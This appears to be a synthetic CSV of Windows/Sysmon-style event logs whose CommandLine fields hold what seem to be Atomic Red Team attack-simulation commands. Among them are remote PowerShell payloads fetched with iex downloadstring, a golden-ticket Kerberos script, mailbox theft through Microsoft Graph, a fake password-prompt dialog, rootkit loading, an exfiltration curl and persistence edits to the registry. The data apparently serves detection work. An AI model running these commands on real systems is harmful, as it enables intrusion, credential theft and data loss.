EventID,EventType,ComputerName,User,ProcessID,ProcessName,CommandLine,LogonID,LogonGuid,SourceProcessID,SourceProcessName,SourceImage,DestinationProcessID,DestinationProcessName,DestinationImage,UtcTime
11,File Create,srv-54.shannon-small.net,ortiztimothy,8787,nc.exe,"""osascript -e 'tell app \""System Preferences\"" to activate' -e 'tell app \""System Preferences\"" to activate' -e 'tell app \""System Preferences\"" to display dialog \""Software Update requires that you type your password to apply changes.\"" & return & return  default answer \""\"" with icon 1 with hidden answer with title \""Software Update\""'\n"",",994076,eac847a3-47e0-4792-a536-48d5edd2a011,2257,regsvr32.exe,C:\Users\Public\front..dll,1233,rundll32.exe,C:\Windows\take..dll,2024-05-17T01:36:51.674618Z
1,Process Create,desktop-27.chavez-young.com,lhernandez,4107,malware.exe,"""tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n"",",509820,2a749fe7-9b4b-4741-bf50-1e9d1e13c0e6,9550,cmd.exe,C:\Users\Public\quickly..dll,7463,powershell.exe,C:\Program Files\into..dll,2024-05-17T01:36:51.674618Z
1,Process Create,laptop-49.dunlap.net,william36,9763,rundll32.exe,"""pw useradd art -g wheel -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\npw lock art\npw usermod art -e +1d\npw unlock art\npw user mod art -e +99d\nsu art\nwhoami\nexit\n"",",187666,a6548107-032e-47f2-b63f-aacbb4f54b15,2514,backdoor.exe,C:\Program Files\himself..exe,5694,malware.exe,C:\Windows\current..dll,2024-05-17T01:36:51.674618Z
1,Process Create,db-32.cooper.com,sboyer,5820,taskmgr.exe,"""Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\n$file1 = \""C:\\Users\\\"" + $env:username + \""\\Desktop\\TeamViewer_Setup.exe\""\nStart-Process -Wait $file1 /S; \nStart-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'\n"",",154963,3167ac36-f5b2-4a9f-8615-5ff08a8c7201,3974,taskmgr.exe,C:\Program Files\house..dll,5742,powershell.exe,C:\Program Files\answer..exe,2024-05-17T01:36:51.674618Z
5,Process Terminate,laptop-34.gomez-sanchez.com,sherrythomas,7747,powershell.exe,"""\""#{uacme_exe}\""\n"",",690796,eb148dff-74ed-4db6-8064-3d970a0d149d,7601,taskmgr.exe,C:\Users\Public\myself..exe,7112,cmd.exe,C:\Users\Public\technology..exe,2024-05-17T01:36:51.675622Z
1,Process Create,laptop-50.waters.info,ashleeflores,1373,rundll32.exe,"""mkdir -p /var/spool/mail/copy\nfor file in /var/spool/mail/*; do\n  if [ \""$(basename \""$file\"")\"" != \""copy\"" ]\n  then\n    cp -R \""$file\"" /var/spool/mail/copy/\n  fi\ndone\nrm -rf /var/spool/mail/copy/*\n"",",251799,dcac379e-1715-485d-b7e3-a9e7b9d07f8c,8110,nc.exe,C:\Program Files\program..exe,1401,nc.exe,C:\Users\Public\community..dll,2024-05-17T01:36:51.675801Z
7,Image Load,db-50.sutton.com,xcarpenter,6097,powershell.exe,"""ls -recurse\nget-childitem -recurse\ngci -recurse\n"",",154345,04fb13c7-d428-417a-b7f7-9a5a58abc181,4425,backdoor.exe,C:\Users\Public\lose..exe,3463,cmd.exe,C:\Windows\go..exe,2024-05-17T01:36:51.675801Z
1,Process Create,desktop-67.white.biz,breweralexander,7848,rundll32.exe,"""Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid}"",",132547,674cf9e6-3ae5-47b6-8793-b843cce305cf,8820,powershell.exe,C:\Users\Public\full..exe,7884,malware.exe,C:\Users\Public\finally..exe,2024-05-17T01:36:51.676740Z
3,Network Connection,db-26.clark-ortiz.com,ritamatthews,3216,cmd.exe,"""New-PSSession -ComputerName #{hostname_to_connect}\nTest-Connection $env:COMPUTERNAME\nSet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \""T1086 PowerShell Session Creation and Use\""\nGet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\nRemove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n"",",402115,b280337a-2f08-4c19-b3b6-38ac221ebed6,2087,cmd.exe,C:\Windows\happy..exe,6619,mimikatz.exe,C:\Windows\show..dll,2024-05-17T01:36:51.676740Z
5,Process Terminate,email-45.thompson.com,harry19,8276,mimikatz.exe,"""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} \""#{input_file}\""\n"",",437338,3bfe6744-7d77-4257-b28a-af58e3b6a645,6360,taskmgr.exe,C:\Program Files\already..dll,3562,explorer.exe,C:\Program Files\help..dll,2024-05-17T01:36:51.676740Z
11,File Create,laptop-28.ferguson.com,coledaniel,4715,explorer.exe,"""ip tcp_metrics show |grep --invert-match \""^127\\.\""\n"",",376678,d3d5f628-5346-4d6f-81c8-d30e77fd4c41,2251,cmd.exe,C:\Users\Public\like..exe,5118,powershell.exe,C:\Users\Public\yourself..exe,2024-05-17T01:36:51.677739Z
3,Network Connection,email-40.richards.net,coreywilson,1983,cmd.exe,"""rm -rf #{folder_to_delete}\n"",",511787,8a9731f8-f297-4f17-adfb-6d3d35432684,4309,regsvr32.exe,C:\Program Files\so..dll,5269,explorer.exe,C:\Windows\draw..dll,2024-05-17T01:36:51.677739Z
3,Network Connection,web-05.montoya-rangel.info,qduran,2710,powershell.exe,"""sc.exe stop #{service_name}\n"",",734330,cb194b9f-86e1-4d31-b23f-2f1e513096ec,6923,regsvr32.exe,C:\Program Files\house..dll,2628,rundll32.exe,C:\Users\Public\off..exe,2024-05-17T01:36:51.677739Z
7,Image Load,email-34.glover.net,hunter56,4589,cmd.exe,"""python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: \""\"".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = \""#{encrypted_command}\""; key = \""#{xor_key}\""; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'"",",741130,00ae6bc8-056c-43cf-9672-7ce118c584ff,5960,explorer.exe,C:\Users\Public\administration..dll,3917,explorer.exe,C:\Program Files\boy..exe,2024-05-17T01:36:51.678740Z
3,Network Connection,email-26.young-johnson.com,gallegosdouglas,7052,taskmgr.exe,"""sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)\n"",",408060,d27ba13c-b074-4609-9c72-a85f0518bb5d,4788,rundll32.exe,C:\Program Files\Mr..exe,4029,explorer.exe,C:\Program Files\move..dll,2024-05-17T01:36:51.678740Z
3,Network Connection,web-59.simmons.biz,dawn04,1219,cmd.exe,"""\""PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"" -f (objectcategory=organizationalUnit) #{optional_args}\n"",",515231,14313ccb-d2db-48f1-a85a-aad10f166541,7039,explorer.exe,C:\Windows\go..exe,2408,taskmgr.exe,C:\Program Files\trade..exe,2024-05-17T01:36:51.678740Z
11,File Create,lt-99.price.com,kwood,3098,powershell.exe,"""wmic #{wmic_command} /FORMAT:\""#{local_xsl_file}\""\n"",",272125,2afd6dfe-571b-45e4-b2b8-54e686da2309,7318,rundll32.exe,C:\Windows\happy..dll,3676,backdoor.exe,C:\Windows\man..exe,2024-05-17T01:36:51.678740Z
11,File Create,lt-70.williams-austin.com,thompsondean,9945,rundll32.exe,"""reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f\n"",",274603,761679fa-027f-4192-b646-624013225a9f,8458,backdoor.exe,C:\Users\Public\together..exe,9478,explorer.exe,C:\Windows\want..exe,2024-05-17T01:36:51.678740Z
7,Image Load,db-52.carter-brown.com,aaronstein,5266,malware.exe,"""echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n"",",600050,5c4c3f9f-b53b-47cd-abae-57f8254feefa,8388,powershell.exe,C:\Program Files\kitchen..exe,3741,explorer.exe,C:\Program Files\very..dll,2024-05-17T01:36:51.678740Z
7,Image Load,laptop-41.irwin.com,mckinneypatrick,7445,malware.exe,"""echo 1> /proc/sys/kernel/sysrq \necho b> /proc/sysrq-trigger \n"",",715574,c727d95f-0c47-4b5e-8e2b-693ee151802e,4412,mimikatz.exe,C:\Windows\spring..dll,7744,rundll32.exe,C:\Program Files\allow..dll,2024-05-17T01:36:51.679739Z
3,Network Connection,web-76.bean.com,richardterry,3351,malware.exe,"""xwd -root -out #{output_file}\nxwud -in #{output_file}\n"",",532727,9dfe4eff-2c59-481c-bc59-b6b85bccf38f,2030,explorer.exe,C:\Windows\page..dll,4594,regsvr32.exe,C:\Program Files\against..exe,2024-05-17T01:36:51.679739Z
5,Process Terminate,db-14.smith.com,graykaren,7926,mimikatz.exe,"""DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}\n"",",431028,d53f6a43-efa4-4f45-aa77-853f4d9e229f,7407,mimikatz.exe,C:\Program Files\soon..dll,5879,regsvr32.exe,C:\Windows\between..dll,2024-05-17T01:36:51.679739Z
11,File Create,desktop-82.jones.biz,hdavis,6532,nc.exe,"""sudo insmod #{rootkit_path}/#{rootkit_name}.ko\n"",",699199,d8d5095c-73a0-43ac-ab95-4f7057520eeb,5522,cmd.exe,C:\Users\Public\couple..dll,5293,rundll32.exe,C:\Program Files\safe..dll,2024-05-17T01:36:51.680740Z
5,Process Terminate,laptop-22.chambers-parker.com,emmaschmidt,9479,nc.exe,"""schtasks.exe /Change /TN \""\\Microsoft\\Windows\\SystemRestore\\SR\"" /disable\n"",",679968,1e3e0761-1ff2-4e22-9e0e-f3298ddb1fb1,5212,malware.exe,C:\Windows\degree..dll,5153,taskmgr.exe,C:\Program Files\pressure..exe,2024-05-17T01:36:51.680740Z
11,File Create,srv-53.cole.com,baldwinwalter,7545,backdoor.exe,"""Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\ncmd.exe /c \""#{local_folder}\\#{local_executable}\"" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\""golden_\"")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n# create batch file with commands to run in a separate \""runas /netonly\"" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \""runas /netonly\"" output otherwise\n@\""\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n  \""#{local_folder}\\#{local_executable}\"" ptt /ticket:kirbifile\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\$(#{domaincontroller})\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\""@ -Replace \""kirbifile\"", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \""foo\"" | runas /netonly /user:fake \""$env:TEMP\\golden.bat\"" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \""$env:TEMP\\golden.txt\"" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n"",",950821,50409f32-0779-4f2c-be71-f42064986135,3243,taskmgr.exe,C:\Windows\article..exe,4898,cmd.exe,C:\Windows\writer..exe,2024-05-17T01:36:51.680740Z
5,Process Terminate,web-43.lopez.com,heidi86,6629,regsvr32.exe,"""cp /bin/sh /tmp/crond;\necho 'sleep 5' | /tmp/crond\n"",",557025,27619ab2-afa6-4946-86fa-6efc85ef7b96,1431,explorer.exe,C:\Windows\cup..exe,4504,rundll32.exe,C:\Users\Public\each..dll,2024-05-17T01:36:51.680740Z
1,Process Create,srv-85.brown.com,coopermicheal,2672,regsvr32.exe,"""Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop"",",980973,01ec81a9-b0a2-4ede-90f5-41cc29ad9194,8860,nc.exe,C:\Users\Public\within..dll,5783,explorer.exe,C:\Program Files\everything..exe,2024-05-17T01:36:51.680740Z
1,Process Create,web-08.johnston.com,tarawalton,2261,mimikatz.exe,"""reg add \""HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\"" /v \""NoAutoRebootWithLoggedOnUsers\"" /t REG_DWORD /d 1 /f\n"",",835148,36b94b7f-f4cf-4478-9dd1-a9e9dd9f3049,4315,cmd.exe,C:\Program Files\structure..exe,8756,taskmgr.exe,C:\Users\Public\left..exe,2024-05-17T01:36:51.681739Z
1,Process Create,web-00.smith.com,tara55,7731,taskmgr.exe,"""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')"",",694492,d3c74452-562a-4f66-b4fe-a0e8c23e8248,3087,nc.exe,C:\Windows\field..exe,4023,powershell.exe,C:\Users\Public\government..exe,2024-05-17T01:36:51.681739Z
3,Network Connection,desktop-61.garrett.com,lisacampbell,5058,regsvr32.exe,"""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput"",",302872,9fc0cb91-b395-4baf-b17b-b4b24114d360,4046,mimikatz.exe,C:\Program Files\begin..dll,5847,malware.exe,C:\Users\Public\against..dll,2024-05-17T01:36:51.681739Z
7,Image Load,srv-21.gill.com,meredithsummers,4570,nc.exe,"""set file=#{output_file_path}\\user_info_%random%.tmp\necho Username: %USERNAME% > %file%\necho User Domain: %USERDOMAIN% >> %file%\nnet users >> %file%\nquery user >> %file%\n"",",274317,95fa8de2-ffae-4834-a4e4-d3f83ab97a3f,8946,regsvr32.exe,C:\Windows\drive..exe,6622,regsvr32.exe,C:\Windows\player..exe,2024-05-17T01:36:51.681739Z
1,Process Create,email-97.cooley.org,mpaul,8950,backdoor.exe,"""$ss = ConvertTo-SecureString \""#{password}\"" -AsPlainText -Force\n$cred = New-Object PSCredential -ArgumentList '#{username}', $ss\n$param = @{\n    Credential = $cred\n    Force      = $true\n}\n$null = Connect-AzAccount @param\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\n$cert = New-SelfSignedCertificate -Subject \""CN=PowerShell Application\"" -CertStoreLocation \""Cert:\\CurrentUser\\My\"" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\n$reqResourceAccess = ( @{ \""resourceAccess\"" = (@{\""id\""= \""570282fd-fa5c-430d-a7fd-fc8dc98a9dca\""; \""type\""= \""Scope\""}, @{ \""id\""= \""7427e0e9-2fba-42fe-b0c0-848c9e6a8182\""; \""type\""= \""Scope\""}, @{\""id\""= \""37f7f235-527c-4136-accd-4a02d197296e\""; \""type\""= \""Scope\""}, @{\""id\""= \""14dad69e-099b-42c9-810b-d002981feec1\""; \""type\""= \""Scope\""}, @{ \""id\""= \""e1fe6dd8-ba31-4d61-89e7-88639da4683d\""; \""type\""= \""Scope\""}, @{ \""id\""= \""810c84a8-4a9e-49e6-bf7d-12d183f40d01\""; \""type\""= \""Role\""}); \""resourceAppId\"" = \""00000003-0000-0000-c000-000000000000\"" })\nconnect-mggraph -AccessToken $token\n$context = Get-MgContext       \n$users = get-MgUser\n$app = New-MgApplication -DisplayName \""T1114.002 Atomic Test #1 - Office365 - Remote Email Collection\"" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\""http://localhost\""; } -KeyCredentials @(@{ Type=\""AsymmetricX509Cert\""; Usage=\""Verify\""; Key=$cert.RawData })\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\n$resourceSPN = Get-MgServicePrincipal -Filter \""AppId eq '$($app.AppId)'\""\n$graphApiApp = Get-MgServicePrincipal -Filter \""DisplayName eq 'Microsoft Graph'\""\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \""Mail.Read\""\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\n$mailbox1 = \""#{1st_target_mailbox}\""\n$mailbox2 = \""#{2nd_target_mailbox}\""\n$mailbox3 = \""#{3rd_target_mailbox}\""\n[System.Collections.ArrayList]$selectUsers = @()\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\nforeach ($user in $selectUsers) { $url= \""https://graph.microsoft.com/v1.0/users/$($user)/messages\"" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\n"",",865100,66a46122-0d3f-4fa6-afe8-ec0cdacb2d24,4136,mimikatz.exe,C:\Windows\detail..dll,6395,rundll32.exe,C:\Users\Public\truth..dll,2024-05-17T01:36:51.682739Z
5,Process Terminate,email-06.smith-lewis.org,timothyfernandez,3886,mimikatz.exe,"""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput"",",835823,a19cf8ca-fb3f-4ad4-b9be-97bd0b64d00d,5789,backdoor.exe,C:\Program Files\support..exe,3961,explorer.exe,C:\Users\Public\fact..dll,2024-05-17T01:36:51.682739Z
1,Process Create,lt-85.lee-green.net,crystalgonzales,4426,rundll32.exe,"""sudo smbstatus --shares\n"",",664915,7450ee26-07bf-4857-ab33-06b7ebae9106,1991,mimikatz.exe,C:\Program Files\free..exe,8316,cmd.exe,C:\Users\Public\she..dll,2024-05-17T01:36:51.682739Z
1,Process Create,srv-94.cooper-crane.com,cummingstaylor,6322,rundll32.exe,"""$credFile = \""#{cred_file}\""\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \""#{new_password}\""){\n      Write-Host -ForegroundColor Yellow \""The new password is the same as the password stored in the credential file. Please specify a different new password.\""; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \""Error code: $errCode\""\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\""\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \""Successfully changed the password to #{new_password}\""\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \""#{new_password}\"" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \""You must store the password of the current user by running the prerequisite commands first\""\n}\n"",",438740,9c18e78a-2789-459f-ad9b-e0b5474134cc,4013,nc.exe,C:\Windows\require..dll,1383,backdoor.exe,C:\Users\Public\class..dll,2024-05-17T01:36:51.682739Z
11,File Create,db-82.ray.com,jjohnson,8066,explorer.exe,"""C:\\Windows\\system32\\cmd.exe /c \""mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\""\n"",",537820,2db31cd0-7a94-41a1-bd83-e58eb84df896,8325,rundll32.exe,C:\Program Files\community..exe,5625,nc.exe,C:\Program Files\ability..exe,2024-05-17T01:36:51.683739Z
1,Process Create,web-93.garcia-reyes.info,paulnguyen,3294,taskmgr.exe,"""dir /s c:\\ >> #{output_file}\ndir /s \""c:\\Documents and Settings\"" >> #{output_file}\ndir /s \""c:\\Program Files\\\"" >> #{output_file}\ndir \""%systemdrive%\\Users\\*.*\"" >> #{output_file}\ndir \""%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\"" >> #{output_file}\ndir \""%userprofile%\\Desktop\\*.*\"" >> #{output_file}\ntree /F >> #{output_file}\n"",",325580,196f2407-7b50-4ad5-928c-72fc9d39927e,2586,regsvr32.exe,C:\Users\Public\century..dll,2669,powershell.exe,C:\Windows\someone..exe,2024-05-17T01:36:51.683739Z
5,Process Terminate,web-87.carter.com,renee56,7213,rundll32.exe,"""dir c:\\ /b /s .key | findstr /e .key\n"",",303928,a23f8a5e-51bf-4a82-b100-fcd5d6228187,1159,malware.exe,C:\Program Files\perhaps..dll,1470,backdoor.exe,C:\Windows\system..exe,2024-05-17T01:36:51.683739Z
5,Process Terminate,web-72.soto.com,alicia06,9012,cmd.exe,"""ENCODED=$(echo '#{message}' | xxd -ps -c 256)\nprintf $ENCODED | xxd -r -p\necho $ENCODED | xxd -r -p\necho $(echo $ENCODED) | xxd -r -p\necho $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}\necho $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p\n"",",999465,418331ad-9635-4a77-88ea-2c32e04ea1b7,8764,malware.exe,C:\Windows\hold..dll,4703,nc.exe,C:\Windows\today..dll,2024-05-17T01:36:51.683739Z
3,Network Connection,web-83.bishop.biz,joanna19,7480,powershell.exe,"""Set-ItemProperty \""HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\"" \""Shell\"" \""explorer.exe, #{binary_to_execute}\"" -Force\n"",",341046,faf18130-8155-4905-8a43-cea958f2c9f9,1274,powershell.exe,C:\Program Files\speak..exe,9157,malware.exe,C:\Program Files\network..dll,2024-05-17T01:36:51.684740Z
